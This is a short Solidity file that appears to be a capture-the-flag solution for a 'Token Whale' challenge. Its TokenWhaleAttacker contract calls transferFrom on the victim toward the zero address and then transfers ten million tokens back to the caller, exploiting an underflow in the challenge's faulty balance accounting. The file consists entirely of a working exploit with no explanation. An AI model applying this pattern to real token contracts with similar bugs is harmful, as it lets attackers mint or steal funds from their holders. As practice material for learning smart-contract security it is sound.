//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;

interface ITokenWhaleChallenge {
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external;

    function transfer(address to, uint256 value) external;

    function balanceOf(address account) external returns (uint256);
}

contract TokenWhaleAttacker {
    function exploit(address _challenge, uint256 amount) external {
        ITokenWhaleChallenge(_challenge).transferFrom(
            msg.sender,
            address(0),
            amount
        );

        ITokenWhaleChallenge(_challenge).transfer(msg.sender, 10000000);
    }
}
